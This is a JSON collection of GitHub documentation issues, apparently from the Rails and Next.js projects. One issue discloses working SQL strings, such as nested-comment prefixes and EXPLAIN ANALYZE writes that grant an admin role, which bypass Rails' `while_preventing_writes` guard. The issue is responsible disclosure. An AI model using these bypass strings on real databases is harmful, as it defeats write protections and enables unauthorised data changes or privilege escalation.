[{"labels":["documentation"],"text":"It seems that @radar started working on an overhaul of the Getting Started guide a while back but only the first (#38268) of the PRs batch (#38328 #38329) got merged. This resulted on the [guide](https://edgeguides.rubyonrails.org/getting_started.html) being inconsistent. More specifically, at the [hello rails section](https://edgeguides.rubyonrails.org/getting_started.html#say-hello-rails) we moved away from introducing a welcome controller, but [later in the guide](https://edgeguides.rubyonrails.org/getting_started.html#setting-the-application-home-page) it is still referenced.\r\n\r\nWhat do you think is the best course of action here? The rest of the work is still there (see stale PRs above), should this be reverted or re-open the rest of the PRs? I can help with proof-reading and squashing/rebasing."},{"labels":[null,"documentation"],"text":"[`ActiveRecord::Base.create_or_find_by/!`](https://apidock.com/rails/v6.0.0/ActiveRecord/Relation/create_or_find_by) attempts to improve on [`ActiveRecord::Base.find_or_create_by/!`](https://apidock.com/rails/v6.0.0/ActiveRecord/Relation/find_or_create_by) by avoiding race conditions that the previous implementation was susceptible to.\r\n\r\n`create_or_find_by` attempts to first create the record while relying on the database uniqueness constraint to inform us if it already exists.\r\nWhen the record does exist, it catches an exception and finds the record using the attributes provided. \r\n\r\nMy initial expectation of the method was that if used properly, it's expected to always return a record, even in concurrent situations.\r\n\r\nThe new strategy is still susceptible to race conditions which are not mentioned in the docs, the behavior in these cases is dependent on the database isolation level. \r\n\r\nMore concretely, `create_or_find_by` could raise a `RecordNotFound` if called from within an existing transaction in a repeatable reads isolation level.\r\n\r\nGiven how common it is for application code to run within an existing transaction (For example, code inside AR callbacks), and the fact that repeatable reads is the default isolation level for mysql, I think this is a fairly common use case.\r\n\r\n### Reproduction\r\n\r\nRepeatable read guarantees a consistent snapshot of the database, in InnoDB, the snapshot is established during the [first read](https://dev.mysql.com/doc/refman/8.0/en/innodb-transaction-isolation-levels.html). This means that if our transaction performed a read before a record is created by another transaction, we won't \"see\" it. In respect to uniqueness constraints, if we try inserting a record that violates it, the database would still protect us, but if we try querying for the record, it'll seem like it doesn't exist.\r\n\r\nIn the context of [`ActiveRecord::Base.create_or_find_by/!`](https://apidock.com/rails/v6.0.0/ActiveRecord/Relation/create_or_find_by), this would manifest as a uniqueness error being raised, but the record not existing.\r\n\r\n```ruby\r\ndef create_or_find_by(attributes, &block)\r\n  transaction(requires_new: true) { create(attributes, &block) }\r\nrescue ActiveRecord::RecordNotUnique \r\n  # exception caught, but we can't see the record because it's not present in our snapshot \r\n  find_by!(attributes)\r\nend\r\n```\r\n\r\nI created a few [test cases](https://gist.github.com/mzruya/603f722ede1615fd7957cfd95a4d466c#file-test_create_or_find_by_race_condition-rb-L101-L127) that demonstrate the issue.\r\n\r\n### Suggestions\r\nIt doesn't seem like it's possible to fix this behavior, the database isolation level would always prevent us from returning something that another connection committed. \r\n\r\nI do think that there's a misconception (at least I had it) that `ActiveRecord::Base.create_or_find_by` is meant to be atomic and work correctly in concurrent situations. \r\n\r\nTherefore it probably makes sense to document this behavior a bit more thoroughly and mention these caveats in the [docs](https://apidock.com/rails/v6.0.0/ActiveRecord/Relation/create_or_find_by).\r\n\r\nI'll gladly take on improving the current documentation if that seems reasonable.\r\nBut I'd also love to hear if anyone has any other thoughts on this behavior.\r\n\r\nThank you!"},{"labels":[null,"documentation"],"text":"### Steps to reproduce\r\nexecutable test case:\r\nhttps://gist.github.com/patrickneugebauer/6cd48c71835cf03aa2a332871f26efdf\r\n\r\n### Expected behavior\r\n`validates_presence_of :record` will not allow save if `record` is not persisted and cannot be persisted.\r\n\r\n### Actual behavior\r\n`validates_presence_of :record` allows save if `record` is not persisted and cannot be persisted.\r\n\r\n### System configuration\r\n**Rails version**: Rails 6.0.3.1\r\n\r\n**Ruby version**: ruby 2.7.1p83 (2020-03-31 revision a0c7c23c9c) [x86_64-linux]\r\n\r\n### Did you write a patch that fixes a bug?\r\nNo, wondering if this is expected before I dig in further.\r\nShould people just know to use `validated_presence_of :record, :record_id` together to ensure integrity of connections?\r\n\r\nI checked the documentation and it is not technically wrong, but I feel it could be improved by adding detail about what is expected.\r\n\r\nhttps://guides.rubyonrails.org/active_record_validations.html#presence\r\n\r\n> If you want to be sure that an association is present, you'll need to test whether the associated object itself is present, and not the foreign key used to map the association. This way, it is not only checked that the foreign key is not empty but also that the referenced object exists.\r\n```\r\nclass LineItem < ApplicationRecord  \r\n  belongs_to :order  \r\n  validates :order, presence: true\r\nend\r\n```\r\n"},{"labels":["documentation"],"text":"[self-join](https://guides.rubyonrails.org/association_basics.html#self-joins) guide says `In your migrations/schema, you will add a references column to the model itself.`\r\n```ruby\r\nclass CreateEmployees < ActiveRecord::Migration[5.0]\r\n  def change\r\n    create_table :employees do |t|\r\n      # this woudn't create foreign_key to employees table\r\n      t.references :manager\r\n      # alternative we need to use to_table option with foreign_key\r\n      t.references :manager, foreign_key: { to_table: :employees }\r\n      t.timestamps\r\n    end\r\n  end\r\nend\r\n```"},{"labels":["documentation"],"text":"![image](https://user-images.githubusercontent.com/48516031/82900356-fb639000-9f8e-11ea-909f-cbdd1ff1155d.png)\r\nIn the Rails Installer page\r\n![image](https://user-images.githubusercontent.com/48516031/82900496-3665c380-9f8f-11ea-8e3b-59e09f97d8f7.png)\r\nShouldn't this be updated? Or specify the Rails Installer is for quickly installing lower versions of rails and if user wants the newest version of rails they should follow the following installation instructions?\r\n![image](https://user-images.githubusercontent.com/48516031/82901086-04a12c80-9f90-11ea-88f3-8446f89ce4f0.png)\r\n\r\n\r\n"},{"labels":[null,"documentation"],"text":"The `ActiveRecord::Base.connection_handler.while_preventing_writes` method does not prevent all writes as the name suggests.\r\n\r\nThis should be mentioned in the method documentation, particularly because in the [original Changelog](https://github.com/eileencodes/rails/blob/f39d72d5267baed1000932831cda98503d1e1047/activerecord/CHANGELOG.md) the author @eileencodes does mention this.\r\n\r\n### Description\r\n\r\nWhile looking for a way to safely expose a sql query parameter I stumbled upon the `while_preventing_writes` method. I was surprised that I wouldn't need a another readonly DB user. Not quite sure if this would really work, I did some digging and found that, at least in Postgresql, this method is not sufficient to block all writes. \r\n\r\n### Steps to reproduce\r\n\r\nAll of the following queries do write to a Postgresql database in a `while_preventing_writes` block:\r\n\r\n#### Explain analyze\r\n\r\nPostgresql let's you not only explain a query, you can also [explain and analyze](https://www.postgresql.org/docs/current/sql-explain.html) a query which actually **runs** it and also analyzes it:\r\n\r\n```ruby\r\nActiveRecord::Base.connection_handler.while_preventing_writes do\r\n  ActiveRecord::Base.connection.execute \"EXPLAIN ANALYZE INSERT INTO roles_users (role_id, user_id) VALUES (1, 1234)\"\r\n  ActiveRecord::Base.connection.execute \"EXPLAIN ANALYZE UPDATE users SET role = 'admin' WHERE id = 10\"\r\n  ActiveRecord::Base.connection.execute \"EXPLAIN ANALYZE DELETE FROM users WHERE id = 26\"\r\nend\r\n```\r\n\r\n#### Nested comments\r\n\r\nPostgres has a [peculiar comment syntax](https://www.postgresql.org/docs/current/sql-syntax-lexical.html#SQL-SYNTAX-COMMENTS) which lets you nest comments within other comments:\r\n\r\n```\r\n/* comment with nesting: /* nested comment */ */\r\n```\r\n\r\nThat is why these comments look like SELECT queries to the regular expression [READ_QUERY](https://github.com/rails/rails/blob/7cd59448ba7b841b47cf8fdbdab55053e56ba787/activerecord/lib/active_record/connection_adapters/postgresql/database_statements.rb#L23) which is supposed to guard against writes, but to the SQL parser they are comments:\r\n\r\n```ruby\r\nActiveRecord::Base.connection_handler.while_preventing_writes do\r\n  ActiveRecord::Base.connection.execute \"/*/**/SELECT*/ INSERT INTO roles_users (role_id, user_id) VALUES (1, 1234)\"\r\n  ActiveRecord::Base.connection.execute \"/*/**/SELECT*/ UPDATE users SET role = 'admin' WHERE id = 10\"\r\n  ActiveRecord::Base.connection.execute \"/*/**/SELECT*/ DELETE FROM users WHERE id = 26\"\r\nend\r\n```\r\n\r\n#### Select into\r\n\r\nFinally postgres let's you create tables using the [`SELECT INTO` statement](https://www.postgresql.org/docs/12/sql-selectinto.html), which starts the query with a `SELECT` but then goes on to write the result into a new table. While it cannot write into an existing table, technically it's still a write query:\r\n\r\n```ruby\r\nActiveRecord::Base.connection_handler.while_preventing_writes do\r\n  ActiveRecord::Base.connection.execute \"SELECT * INTO users_new FROM users\"\r\nend\r\n```\r\n\r\n### Expected behavior\r\n\r\nThe writing queries are not applied to the database.\r\n\r\n### Actual behavior\r\n\r\nThe queries are written to the database.  The [regular](https://github.com/rails/rails/blob/7cd59448ba7b841b47cf8fdbdab55053e56ba787/activerecord/lib/active_record/connection_adapters/postgresql/database_statements.rb#L23) [expression](https://github.com/rails/rails/blob/7cd59448ba7b841b47cf8fdbdab55053e56ba787/activerecord/lib/active_record/connection_adapters/abstract_adapter.rb#L69) which is supposed to guard against write queries does not catch the write statements.\r\n\r\n### Discussion\r\n\r\nI suspect that parsing SQL with regexes is like parsing HTML with regexes: it cannot work. I suspect that @eileencodes was aware of the limitations of this regular expression approach and mentioned them in the Changelog at the time.\r\n\r\nI did spend a fair amount of time trying to fix these issues and I believe that a somewhat more complex Regex will be able to catch some of these issues, but not all.\r\n\r\nConsidering that the nested comments can have any level of depth, I don't think that they can be solved with Regexes. You will need to parse the SQL and strip out the comments entirely to safeguard against those.\r\n\r\nThe `SELECT INTO` issue is complex as well, as there can be a lot of statements between the `SELECT` and the `INTO` some of which may be strings or comments, so the regular expression approach is probably not going to work here as well. \r\n\r\nI have tests and a fix for the `EXPLAIN ANALYZE` queries, if you want me to I can open a pull request for those. I will add a pull request for the documentation change.\r\n\r\n### System configuration\r\n\r\n* Rails master\r\n* ruby 2.7.0p0\r\n* vagrant@rails-dev-box\r\n"},{"labels":[null,"documentation"],"text":"### Steps to reproduce\r\nSearch through the testing portion of the guide [https://edgeguides.rubyonrails.org/testing.html](https://edgeguides.rubyonrails.org/testing.html) for an example on how to test a post with a json body.\r\n\r\nThe result will be that you won't find an example that makes it clear on how to do this. When initializing a rails app, you have an option to build it as an api. So, I'd assume that I'd also learn how to test json body posts.\r\n\r\n### Expected behavior\r\nHave realistic documentation on posting JSON data to a Rails 6 API. I can't find anything at all on how to do this in the guide: [https://edgeguides.rubyonrails.org/testing.html](https://edgeguides.rubyonrails.org/testing.html)\r\n\r\n### Actual behavior\r\nNot able to write a post test that uses a json post body because I simply cannot see how to do it.\r\n\r\n### System configuration\r\n**Rails version**:\r\nlatest\r\n**Ruby version**:\r\nany ruby version"},{"labels":["documentation",null],"text":"### Steps to reproduce\r\nCreate an rails engine\r\nTest it with spec\r\nFails about assets\r\n\r\n### Expected behavior\r\nGuide says https://guides.rubyonrails.org/engines.html#separate-assets-precompiling\r\n```ruby\r\ninitializer \"blorgh.assets.precompile\" do |app|\r\n  app.config.assets.precompile += %w( admin.js admin.css )\r\nend\r\n```\r\n\r\nIt not works. I solved it with\r\n```ruby\r\ninitializer \"blorgh.assets.precompile\" do |app|\r\n  app.config.assets.precompile += %w( engine_name/admin.js engine_name/admin.css )\r\nend\r\n```\r\n\r\n### Actual behavior\r\n<!-- Tell us what happens instead -->\r\n\r\n### System configuration\r\n**Rails version**: 6\r\n\r\n**Ruby version**: 2.7\r\n"},{"labels":["documentation",null],"text":"For now, there is no mention of Webpack in the official guides – neither on edge guides – except for Ruby on Rails 6 release notes and upgrade guide. The documentation of the Webpacker gem is quite good, but a newcomer to Rails wouldn't know at first that he needs to have a look to it.\r\n\r\nSpecifically, it would be good to have a mention of Webpack in the following guides:\r\n* The Asset Pipeline\r\n* Working with JavaScript in Rails\r\n\r\nIn case of more than a simple mention, there could be a quite thorough explanation of the current state of the recommended use of the Rails asset pipeline together with Webpack – e.g. use asset pipeline for normal CSS and images, and use Webpack for JS. It would be good also to mention that Turbolinks and UJS are (now) just Yarn packages.\r\n\r\nAlso, because of Webpack, Rails now depend on having a JS runtime on your computer and Yarn. This is briefly mentionned in the Getting Started guide, section Starting up the Web Server, but it could be more explicit in the Installing Rails part."},{"labels":["documentation"],"text":"The prod and edge versions of \"Getting Started with Rails\" both point to RailsInstaller as a great way to get started on Windows. However, RailsInstaller is offering only Ruby 2.2 and 2.3. When you get to the `bundle install` step, multiple of the standard gems now require at least Ruby 2.4. If we have a relationship with Engine Yard, perhaps a request from the right member of the team would move them to release more current versions of the RailsInstaller downloadables."},{"labels":[null,null,"documentation"],"text":"Rails Guides [state](https://edgeguides.rubyonrails.org/caching_with_rails.html#caching-in-development) that \"Rails provides the rails command dev:cache to easily toggle caching on/off\".\r\n\r\nThis is not entirely true since `NullStore` still caches via `LocalCache`, so there is no way to disable low-level cache within the scope of a single web request, regardless of the toggle.\r\n\r\nThe [low-level caching docs](https://edgeguides.rubyonrails.org/caching_with_rails.html#low-level-caching) don't really help since they provide a model-level example, giving the impression of a generic mechanism independent of web requests or Rack middleware.\r\n\r\nMy questions are:\r\n\r\n1. Why does `NullStore` implement the local cache strategy? Shouldn't it be a veritable bit bucket?\r\n2. Why isn't `ActiveSupport::Cache::Strategy::LocalCache` also toggled via `rails dev:cache`?\r\n3. At the very least, shouldn't this caveat be mentioned in Rails Guides, stating clearly that low-level cache still kicks in within the scope of a web request?\r\n\r\n\r\n### Steps to reproduce\r\n\r\nCreate a new Rails app and make sure to disable local caching:\r\n\r\n```\r\n$ bin/rails dev:cache\r\nDevelopment mode is no longer being cached.\r\n```\r\n\r\nAdd the following to the application layout or any view:\r\n\r\n```\r\n<pre>\r\n<%= Rails.cache.fetch('foo') { rand } %>\r\n<%= Rails.cache.fetch('foo') { rand } %>\r\n</pre>\r\n```\r\n\r\nRun `bin/rails s` and visit the modified view.\r\n\r\n\r\n### Expected behavior\r\n\r\nI'd expect `Rails.cache.fetch` to return different values given that \"development mode is no longer being cached\".\r\n\r\n\r\n### Actual behavior\r\n\r\n`Rails.cache.fetch` still caches values.\r\n\r\n\r\n### System configuration\r\n\r\n**Rails version**: 6.0.2.1\r\n\r\n**Ruby version**: 2.7.0p0\r\n"},{"labels":[null,"documentation"],"text":"There is a wrong guide in [RequestForgeryProtection comment](https://github.com/rails/rails/blob/08e4a71d02ee8556e5a7ebc4b0f8c364e0b8abd6/actionpack/lib/action_controller/metal/request_forgery_protection.rb) and [documentation](https://api.rubyonrails.org/classes/ActionController/RequestForgeryProtection.html)\r\n\r\n```ruby\r\nclass ApplicationController < ActionController::Base\r\n  protect_from_forgery unless: -> { request.format.json? }\r\nend\r\n```\r\n\r\n> It is generally safe to exclude XHR requests from CSRF protection (like the code snippet above does), because XHR requests can only be made from the same origin.\r\n\r\nHowever, as I know same origin policy cannot protect CSRF attack because [it does not prevent sending requests.](https://stackoverflow.com/a/33324803/2566679)\r\n\r\n> ... one origin is permitted to send information to another origin, but one origin is not permitted to receive information from another origin   [Same Origin Policy\r\n](https://www.w3.org/Security/wiki/Same_Origin_Policy)\r\n\r\nIf this is true, I think this guide must be modified, soon.\r\n"},{"labels":["documentation"],"text":"### Steps to reproduce\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\n\r\nFollow the Docs: https://guides.rubyonrails.org/testing.html#using-separate-files\r\n\r\n```ruby\r\n# lib/test/authenticated_test_helper.rb\r\nmodule AuthenticatedTestHelper\r\n  def sign_in(email, password)\r\n    post account_login_url(email: email, password: password)\r\n  end\r\n\r\n  def admin_sign_in(email, password)\r\n    post admin_session_url(email: email, password: password)\r\n  end\r\nend\r\n```\r\n\r\n```ruby\r\n# test/controllers/admin/samples_controller_test.rb\r\nrequire 'test_helper'\r\nrequire 'test/authenticated_test_helper' # << throws: `cannot load such file -- lib/test/authenticated_test_helper\r\n\r\nmodule Admin\r\n  module SamplesControllerTest < ActionDispatch::IntegrationTest\r\n    ...\r\n    ...\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\n<!-- Tell us what should happen -->\r\nIt should find the file since it's defined in EXACTLY the location that's recommended\r\n\r\n### Actual behavior\r\n<!-- Tell us what happens instead -->\r\n```bash\r\n30: from -e:1:in `<main>'\r\n        29: from -e:1:in `require'\r\n        28: from /home/samps/.gem/ruby/2.6.5/gems/bootsnap-1.4.5/lib/bootsnap/load_path_cache/core_ext/kernel_require.rb:54:in `load'\r\n        27: from /home/samps/.gem/ruby/2.6.5/gems/bootsnap-1.4.5/lib/bootsnap/load_path_cache/core_ext/kernel_require.rb:54:in `load'\r\n        26: from /home/samps/sites/cannabislims/bin/rails:9:in `<main>'\r\n        25: from /home/samps/.gem/ruby/2.6.5/gems/zeitwerk-2.2.2/lib/zeitwerk/kernel.rb:23:in `require'\r\n        24: from /home/samps/.gem/ruby/2.6.5/gems/bootsnap-1.4.5/lib/bootsnap/load_path_cache/core_ext/kernel_require.rb:30:in `require'\r\n        23: from /home/samps/.gem/ruby/2.6.5/gems/bootsnap-1.4.5/lib/bootsnap/load_path_cache/core_ext/kernel_require.rb:21:in `require_with_bootsnap_lfi'\r\n        22: from /home/samps/.gem/ruby/2.6.5/gems/bootsnap-1.4.5/lib/bootsnap/load_path_cache/loaded_features_index.rb:92:in `register'\r\n        21: from /home/samps/.gem/ruby/2.6.5/gems/bootsnap-1.4.5/lib/bootsnap/load_path_cache/core_ext/kernel_require.rb:22:in `block in require_with_bootsnap_lfi'\r\n        20: from /home/samps/.gem/ruby/2.6.5/gems/bootsnap-1.4.5/lib/bootsnap/load_path_cache/core_ext/kernel_require.rb:22:in `require'\r\n        19: from /home/samps/.gem/ruby/2.6.5/gems/railties-6.0.2.1/lib/rails/commands.rb:18:in `<main>'\r\n        18: from /home/samps/.gem/ruby/2.6.5/gems/railties-6.0.2.1/lib/rails/command.rb:46:in `invoke'\r\n        17: from /home/samps/.gem/ruby/2.6.5/gems/railties-6.0.2.1/lib/rails/command/base.rb:69:in `perform'\r\n        16: from /home/samps/.gem/ruby/2.6.5/gems/thor-1.0.1/lib/thor.rb:392:in `dispatch'\r\n        15: from /home/samps/.gem/ruby/2.6.5/gems/thor-1.0.1/lib/thor/invocation.rb:127:in `invoke_command'\r\n        14: from /home/samps/.gem/ruby/2.6.5/gems/thor-1.0.1/lib/thor/command.rb:27:in `run'\r\n        13: from /home/samps/.gem/ruby/2.6.5/gems/railties-6.0.2.1/lib/rails/commands/test/test_command.rb:33:in `perform'\r\n        12: from /home/samps/.gem/ruby/2.6.5/gems/railties-6.0.2.1/lib/rails/test_unit/runner.rb:39:in `run'\r\n        11: from /home/samps/.gem/ruby/2.6.5/gems/railties-6.0.2.1/lib/rails/test_unit/runner.rb:50:in `load_tests'\r\n        10: from /home/samps/.gem/ruby/2.6.5/gems/railties-6.0.2.1/lib/rails/test_unit/runner.rb:50:in `each'\r\n         9: from /home/samps/.gem/ruby/2.6.5/gems/railties-6.0.2.1/lib/rails/test_unit/runner.rb:50:in `block in load_tests'\r\n         8: from /home/samps/.gem/ruby/2.6.5/gems/zeitwerk-2.2.2/lib/zeitwerk/kernel.rb:23:in `require'\r\n         7: from /home/samps/.gem/ruby/2.6.5/gems/bootsnap-1.4.5/lib/bootsnap/load_path_cache/core_ext/kernel_require.rb:30:in `require'\r\n         6: from /home/samps/.gem/ruby/2.6.5/gems/bootsnap-1.4.5/lib/bootsnap/load_path_cache/core_ext/kernel_require.rb:21:in `require_with_bootsnap_lfi'\r\n         5: from /home/samps/.gem/ruby/2.6.5/gems/bootsnap-1.4.5/lib/bootsnap/load_path_cache/loaded_features_index.rb:92:in `register'\r\n         4: from /home/samps/.gem/ruby/2.6.5/gems/bootsnap-1.4.5/lib/bootsnap/load_path_cache/core_ext/kernel_require.rb:22:in `block in require_with_bootsnap_lfi'\r\n         3: from /home/samps/.gem/ruby/2.6.5/gems/bootsnap-1.4.5/lib/bootsnap/load_path_cache/core_ext/kernel_require.rb:22:in `require'\r\n         2: from /home/samps/sites/cannabislims/test/controllers/admin/samples_controller_tests/authenticated_test.rb:2:in `<main>'\r\n         1: from /home/samps/.gem/ruby/2.6.5/gems/zeitwerk-2.2.2/lib/zeitwerk/kernel.rb:23:in `require'\r\n/home/samps/.gem/ruby/2.6.5/gems/bootsnap-1.4.5/lib/bootsnap/load_path_cache/core_ext/kernel_require.rb:33:in `require': cannot load such file -- lib/test/authenticated_test_helper (LoadError)\r\n```\r\n### System configuration\r\n**Rails version**: 6.0.2.1\r\n\r\n**Ruby version**: 2.6.5p114 (2019-10-01 revision 67812) [x86_64-linux]\r\n"},{"labels":["documentation",null,null],"text":"I'm experimenting with some custom ajax functionality in a Rails 5 project.\r\n\r\nI've been struggling and struggling to post some data to the server using `Rails.ajax`, and after reading guide after guide, I eventually understood where I was going wrong from a two-year old [Github issue comment](https://github.com/rails/rails/issues/31507#issuecomment-354680347).\r\n\r\nLots of recent third party guides talk about `Rails.ajax` and recommend using it now that `jquery` isn't included by default any more ([for instance](https://www.rubyguides.com/2019/03/rails-ajax/)). If this isn't recommended, to save others the hassle I just went through, I would really appreciate a note in [these docs](https://guides.rubyonrails.org/working_with_javascript_in_rails.html)?"},{"labels":[null,null,"documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nI know there is `config` export for pages and api routes. They are partially described in [api-middlewares#custom-config](https://nextjs.org/docs/api-routes/api-middlewares#custom-config) or in [amp-support](https://nextjs.org/docs/advanced-features/amp-support/introduction) for example.\r\n\r\nI was searching for documentation on that `config` export but I couldn't find it.\r\nAlso: is a typescript type available for the `config` export?\r\n\r\n## To Reproduce\r\n\r\nLook at the next.js docs and search for documetation on `config` export for pages or api routes\r\n\r\n## Expected behavior\r\n\r\nThere is no such documentation on the `config` export"},{"labels":[null,null,"documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nDocs and code are out of sync. See \r\n\r\nhttps://nextjs.org/docs/basic-features/data-fetching#getstaticprops-static-generation\r\n\r\nand\r\n\r\nhttps://github.com/Timer/next.js/blob/canary/packages/next/next-server/server/render.tsx#L611\r\n\r\n## To Reproduce\r\n\r\n```\r\nexport async function getStaticProps(ctx: any) {\r\n  console.log(ctx) // no `preview` at all in ctx\r\n```\r\n\r\n## Expected behavior\r\n\r\nSee https://nextjs.org/docs/basic-features/data-fetching#getstaticprops-static-generation . \r\n\r\n\"preview is true if the page is in the preview mode and false otherwise. See the Preview Mode documentation\"\r\n"},{"labels":[null,"documentation"],"text":"API Routes also have access to the preview data added by Preview Mode in `req.previewData`. Our docs should be updated to reflect that."},{"labels":[null,null,"documentation"],"text":"In our current `canary` release `Link` no longer requires to know the path of a page for client side transitions. We should update our docs to reflect that the usage of the `as` parameter is now optional."},{"labels":[null,null,"documentation",null],"text":"Add a new example called `fast-refresh` to our examples folder that showcases the different features and behaviors of [Fast Refresh](https://nextjs.org/docs/basic-features/fast-refresh).\r\n\r\nUse this removed example for inspiration: https://github.com/vercel/next.js/pull/16497 \r\n\r\nOnce the example is ready, add a link to it in our docs."},{"labels":[null,"documentation",null],"text":"Updates to documentation that were requested by feedback by using the feedback inputs in the Next.js site and in our other community channels (GitHub Discussions, issues):\r\n\r\n- Add missing title to: https://nextjs.org/docs/advanced-features/custom-error-page - The current page doesn't have an `h1` in the beginning, which affects the search results to Algolia looking for content there.\r\n- Remove data-fetch example from the `getInitialProps` docs as it's now using `getStaticProps` and update the example to no longer have `node-fetch` in dependencies.\r\n- Mention PWA on docs. We currently have search results for \"Progressive Web App\" in our search input but not for PWA as it's never mentioned.\r\n- Add caveats to API Routes and mention that next export can't be used with them.\r\n- Reduce the redundancy of next export docs that make it a bit more annoying to navigate (caveats and deployment docs)\r\n"},{"labels":[null,"documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nWhen using getServerSideProps, the staticPrefix seems to be disabled for that page.\r\n\r\n## To Reproduce\r\n\r\nEnable staticPrefix in next.config.js\r\n\r\n```js\r\nexport async function getServerSideProps(context) {\r\n  return {\r\n    props: { translations: [] },\r\n  }\r\n}\r\n```\r\n\r\n## Expected behavior\r\n\r\nThe page keeps working and applies the staticPrefix.\r\n\r\n## Actual behavior\r\n\r\nThe page requests the static resources without the prefix applied.\r\n\r\n## System information\r\n\r\n- OS: Azure\r\n- Browser (if applies): Chrome\r\n- Version of Next.js: 9.5.2\r\n- Version of Node.js: 12\r\n\r\n## Additional context\r\n\r\nI have not debugged thoroughly, but removing `getServerSideProps` fixed the problem."},{"labels":[null,null,"documentation"],"text":"A migration guide for a common application with detailed steps of what has to be done if you want to move your current app in create-next-app to Next.js would be very useful for a lot of new users."},{"labels":[null,null,null,"documentation"],"text":"We should add a note to the headers documentation mentioning that if a header is already set successive ones with the same key will override the value "},{"labels":[null,"documentation"],"text":"Lots of users miss that they can write server side code in `getStaticProps` and `getServerSideProps`.\r\n\r\nWe also see numerous issues about people trying to fetch API routes. We need to fix this in the documentation by making this one of the **first things** we have in the docs."},{"labels":[null,null,"documentation"],"text":"Our Fast Refresh docs currently say that `useEffect` will re-run after every code change, even if it has no dependencies. This is not only to ensure you always write resilient code, because it's also enforced by React Strict Mode. We should mention this and link to the strict mode docs.\r\n\r\nMore on this Twitter thread: https://twitter.com/tvernon_tech/status/1289192339819249666"},{"labels":[null,"documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nThe SASS support of next-js only works for `*.scss` files not `*.sass` files.\r\n\r\n## To Reproduce\r\n\r\nCreate a `*.sass` files in your code and import it in any page if its `*.module.sass` or in `_app.[js|tsx]` if it contain global styles i.e. `*.sass`. You will start getting an error when running the dev server.\r\n\r\n```bash\r\nSassError: Expected newline.\r\n```\r\n\r\nBut if you change them to `scss` extension it starts working again. Although the CSS documentation states that any of the 2 extensions can be used it works only for `scss`.\r\n\r\n## Expected behavior\r\n\r\nIt should work for both extensions.\r\n\r\n## Screenshots\r\n\r\nN/A\r\n\r\n## System information\r\n\r\n- OS: macOS,\r\n- Browser (if applies) [e.g. chrome ]\r\n- Version of Next.js: 9.4.4\r\n- Version of Node.js: 12.x"},{"labels":[null,null,"documentation"],"text":"`--profile` enables production profiling for React and was released in [Next.js 9.5](https://nextjs.org/blog/next-9-5#production-react-profiling)"},{"labels":[null,"documentation"],"text":""},{"labels":[null,"documentation"],"text":"# Feature request\r\n\r\n## Is your feature request related to a problem? Please describe.\r\n\r\nA common URL pattern for blogs and websites coming from Wordpress is `/year/month/day/slug`. To redirect pages that match this to a different page, the path matching would look like this:\r\n\r\n```javascript\r\n{\r\n  source: '/:year/:month/:day/:post',\r\n  destination: '/blog/:post',\r\n  permanent: true,\r\n},\r\n```\r\n\r\nThis however matches generated Next.js files (for example, `/_next/static/css/b9c315e24bcc3c2b5b54.css` which results in effectively breaking the built website (dev mode doesn't match this pattern).\r\n\r\n## Describe the solution you'd like\r\n\r\nBy adding more finegrained matchers like Regex strings, you could restrict the matching to look for numbers only. Using the example above, in the `vercel.json` file I can currently write `\"\\/\\\\d{4}\\/\\\\d{2}\\/\\\\d{2}\\/(.+)\\/?\"` to only match blog posts. \r\n\r\n## Describe alternatives you've considered\r\n\r\nI can achieve this by leveraging platform-specific files such as `vercel.json` but it would be nice to have support for this out of the box!\r\n"},{"labels":[null,null,"documentation"],"text":"From our docs:\r\n\r\n> Next.js supports ES2020 dynamic import() for JavaScript. With it you can import JavaScript modules (inc. React Components) dynamically and work with them. They also work with SSR.\r\n>\r\n> You can think of dynamic imports as another way to split your code into manageable chunks.\r\n\r\nThe above is right, but the entire page only shows examples with `next/dynamic`, which can **only** be used for React Components, and you may end up thinking it's possible to use it with modules, in which case you'll need `import()` instead. We have to be more clear about the differences here."},{"labels":[null,"documentation"],"text":"We have multiple CSS examples, like tailwind, emotion, styled-components, e.t.c, but currently we don't mention them in the documentation. Adding this examples should help people that go to our docs looking for one of the popular libraries but fail in the process."},{"labels":[null,null,"documentation"],"text":"It has been mentioned multiple times on feedback that in the [documentation for Built-In CSS Support](https://nextjs.org/docs/basic-features/built-in-css-support) we don't really recommend CSS Modules over CSS-in-JS, therefore we create confusion about what should be used if both methods handle the same thing.\r\n\r\nWe should update the page to be clear about the advantages of CSS Modules over css-in-js, mainly being that you don't need JS to add the CSS as CSS Modules are concatenated into many minified and code-split `.css` files. Ideally users should end up thinking that CSS Modules are the preferred solution, but any CSS-in-JS library is also an option. "},{"labels":[null,null,null,"documentation"],"text":"We need to add documentation for the new ISR feature (`revalidate` property) for the `getStaticProps` lifecycle."},{"labels":[null,"documentation"],"text":"We currently don't have documentation about what the Next.js build output looks like from an architectural standpoint, this might be useful to add sometime. (it's not a public API that people should use)"},{"labels":[null,"documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nAdding `getStaticProps` overrides folder settings set within `exportPathMap` in `next.config.js`. \r\n\r\nI'm essentially trying to get my html files to be output in `/directory/index.html` rather than `/directory.html`. Unfortunately even I set my `exportPathMap` to do so, as soon as the `getStaticProps` function is added in my script, the setting is overridden and the file will be output at `directory.html`\r\n\r\n## To Reproduce\r\n\r\n```\r\ngit clone https://github.com/creativiii/next-js-export-bug\r\ncd next-js-export-but\r\nnpm run build\r\nnpm run export\r\n```\r\n\r\nThen check the `out` directory.\r\n\r\n## Expected behavior\r\n\r\n`page-1` and `page-2` should be respectively exported in `/page-1/index.html` and `/page-2/index.html`. Instead `page-2` is exported as `page-2.html`.\r\n\r\n## System information\r\n\r\n- OS: [e.g. macOS, Windows]: WSL Ubuntu 20.04\r\n- Version of Next.js: [e.g. 6.0.2] 9.4.4\r\n- Version of Node.js: [e.g. 10.10.0] LTS 12\r\n\r\n"},{"labels":[null,null,"documentation"],"text":"Our docs on catch all routes say the following:\r\n\r\n> Catch all routes can be made optional by including the parameter in double brackets ([[...slug]]).\r\n>\r\n>For example, pages/post/[[...slug]].js will match /post, /post/a, /post/a/b, and so on.\r\n\r\nWhich is very similar to what catch all routes already does, with the difference that it now includes the `/post` example, which is the only difference, but we aren't clear on that.\r\n\r\nTodo: update the section to be clear about the difference so you don't have to figure it out 